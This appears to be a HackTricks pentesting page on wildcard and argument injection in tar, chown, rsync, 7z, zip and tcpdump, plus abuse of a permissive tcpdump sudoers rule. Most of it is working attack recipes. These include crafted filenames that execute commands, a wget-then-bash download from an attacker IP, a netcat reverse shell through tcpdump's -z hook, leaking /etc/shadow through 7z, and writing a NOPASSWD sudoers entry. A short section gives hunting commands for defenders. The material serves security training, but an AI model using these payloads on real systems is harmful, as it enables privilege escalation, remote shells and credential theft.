# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** happens when a privileged script runs a Unix binary such as `tar`, `chown`, `rsync`, `zip`, `7z`, … with an unquoted wildcard like `*`.  
> Since the shell expands the wildcard **before** executing the binary, an attacker who can create files in the working directory can craft filenames that begin with `-` so they are interpreted as **options instead of data**, effectively smuggling arbitrary flags or even commands.<sup>[[6]](#references)</sup>
> This page collects the most useful primitives, recent research and modern detections for 2023-2025.

## chown / chmod

You can **copy the owner/group or permission bits from a reference file** by abusing the `--reference` flag when an option-looking filename is expanded by a wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

When root later executes something like:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

The expanded `--reference=.drf.php` overrides the explicit owner/mode, causing matching files to inherit metadata from `.drf.php` (and, with the setup above, making them writable by the attacker).<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).<sup>[[7]](#references)</sup>
See also the classic DefenseCode paper for details.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Execute arbitrary commands by abusing GNU tar's **checkpoint** feature and checkpoint actions.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Once root runs e.g. `tar -czf /root/backup.tgz *`, `shell.sh` is executed as root.<sup>[[10]](#references)</sup>

### bsdtar / macOS compressor override caveat

The default `tar` on recent macOS (based on `libarchive`) does *not* provide GNU tar's `--checkpoint` interface, but bsdtar documents **--use-compress-program** for selecting an external compressor.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
When a privileged script runs `tar -cf backup.tar *`, this selects `sh` through the victim's `PATH` and bsdtar starts it as the compressor.<sup>[[11]](#references)</sup> This proves option injection but is not, by itself, a reliable arbitrary-command primitive: a wildcard-created filename cannot contain `/`, and bsdtar supplies archive data rather than an attacker-selected shell command. Code execution additionally requires a controllable executable resolved through `PATH` or another argument channel that can name a useful program.

---

## rsync

`rsync` lets you override the remote shell or the remote binary via command-line flags such as `-e` and `--rsync-path`.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

If root later archives the directory with `rsync -az * backup:/srv/`, the injected flag can run a shell through the remote-shell mechanism.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Even when the privileged script *defensively* prefixes the wildcard with `--` (to stop option parsing), the 7-Zip CLI accepts **file list files** by prefixing the filename with `@`. Combining that with a symlink lets you *exfiltrate arbitrary files*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

If root executes something like:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip will attempt to read `root.txt` (→ `/etc/shadow`) as a file list and will bail out, **printing the contents to stderr**.<sup>[[13]](#references)</sup>

This survives `-- *` because the 7-Zip CLI explicitly accepts both regular filenames and `@listfiles` as positional inputs, so a literal filename such as `@root.txt` is still treated specially.<sup>[[13]](#references)</sup>

---

## zip

Two very practical primitives exist when an application passes user-controlled filenames to `zip` (either via a wildcard or by enumerating names without `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T` enables “test archive” and `-TT <cmd>` replaces the tester with an arbitrary program (long form: `--unzip-command <cmd>`). If you can inject filenames that start with `-`, split the flags across distinct filenames so short-options parsing works.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Notes
- Do NOT try a single filename like `'-T -TT <cmd>'` — short options are parsed per character and it will fail. Use separate tokens as shown.<sup>[[3]](#references)</sup>
- If slashes are stripped from filenames by the app, fetch from a bare host/IP (default path `/index.html`) and save locally with `-O`, then execute.<sup>[[3]](#references)</sup>
- You can debug parsing with `-sc` (show processed argv) or `-h2` (more help) to understand how your tokens are consumed.<sup>[[3]](#references)</sup>

Example (local behavior on zip 3.0).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak: If the web layer echoes `zip` stdout/stderr (common with naive wrappers), injected flags like `--help` or failures from bad options will surface in the HTTP response, confirming command-line injection and aiding payload tuning.<sup>[[3]](#references)</sup>

---

## Additional option-injection candidates

When a privileged wrapper expands a writable directory with a wildcard, these documented option hooks are worth checking.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Pass a command string to a shell |
| `git`   | `-c core.sshCommand=<cmd>` | Use `<cmd>` instead of SSH for Git fetch/push |
| `scp`   | `-S <program>` | Use an alternate SSH-compatible connection program |

These primitives are useful checks beyond the *tar/rsync/zip* classics.

---

## Hunting vulnerable wrappers and jobs

Recent case studies and detection guidance show that wildcard/argv injection is no longer just a **cron + tar** problem.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> The same bug class keeps appearing in:

- web features that "download everything as zip/tar" from attacker-controlled upload directories
- vendor/appliance debug shells that expose a **tcpdump** wrapper with attacker-controlled filename/filter fields
- backup or rotation jobs that call `tar`, `rsync`, `7z`, `zip`, `chown`, or `chmod` on writable directories

Useful triage commands (the `pspy` invocation uses its documented process/file-event and interval flags).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Quick heuristics:

- `-- *` is a good fix for many GNU tools, but **not** for `7z`/`7za` because `@listfiles` are parsed separately.<sup>[[13]](#references)</sup>
- For `zip`, look for wrappers that enumerate user-controlled filenames directly; short-option splitting (`-T` + `-TT <cmd>`) still works even without a shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
- For `tcpdump`, pay special attention to wrappers that let you control **output file names**, **rotation settings**, or **capture-file replay** arguments.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

When a restricted shell or vendor wrapper builds a `tcpdump` command line by concatenating user-controlled fields (e.g., a "file name" parameter) without strict quoting/validation, you can smuggle extra `tcpdump` flags. The combo of `-G` (time-based rotation), `-W` (limit number of files), and `-z <cmd>` (post-rotate command) yields arbitrary command execution as the user running tcpdump (often root on appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Preconditions:

- You can influence `argv` passed to `tcpdump` (e.g., via a wrapper like `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- The wrapper does not sanitize spaces or `-`-prefixed tokens in the file name field.<sup>[[4]](#references)</sup>

Classic PoC (executes a reverse shell script from a writable path).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Details:

- `-G 1` rotates every second, and `-W 1` stops after one rotated file; the capture must receive a matching packet before rotation.<sup>[[18]](#references)</sup>
- `-z <cmd>` runs the post-rotate command once per rotation and passes the closed savefile path as an argument; ensure script/interpreter argument handling matches your payload.<sup>[[18]](#references)</sup>

No-removable-media variants:

- If you have any other primitive to write files (e.g., a separate command wrapper that allows output redirection), drop your script into a known path and trigger `-z /path/script.sh`; have the script invoke `/bin/sh` itself if needed.<sup>[[18]](#references)</sup>
- If a vendor wrapper lets you choose the rotated path, audit that path control only in combination with a post-rotate command that interprets its savefile argument; path control alone does not execute file contents.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Example sudoers anti-pattern:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

The rule leaves several options available under tcpdump's documented parser:<sup>[[3]](#references)[[18]](#references)</sup>
- The `*` glob and permissive patterns only constrain the first `-w` argument. `tcpdump` accepts multiple `-w` options; the last one wins.<sup>[[3]](#references)[[18]](#references)</sup>
- The rule doesn’t pin other options, so `-Z`, `-r`, `-V`, etc. are allowed.<sup>[[3]](#references)[[18]](#references)</sup>

The relevant primitives are documented below.<sup>[[3]](#references)[[18]](#references)</sup>
- Override destination path with a second `-w` (first only satisfies sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Path traversal inside the first `-w` to escape the constrained tree.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Force output ownership with `-Z root` (creates root-owned files anywhere).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Arbitrary-content write by replaying a crafted PCAP via `-r` (e.g., to drop a sudoers line).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Create a PCAP that contains the exact ASCII payload and write it as root</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- Arbitrary file read/secret leak with `-V <file>` (interprets a list of savefiles). Error diagnostics often echo lines, leaking content.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1) manual](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1) manual](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip command line syntax](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1) manual](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp` manual](https://man.openbsd.org/scp)
- [18] [tcpdump(8) manual](https://man7.org/linux/man-pages/man8/tcpdump.8.html)

{{#include ../../banners/hacktricks-training.md}}
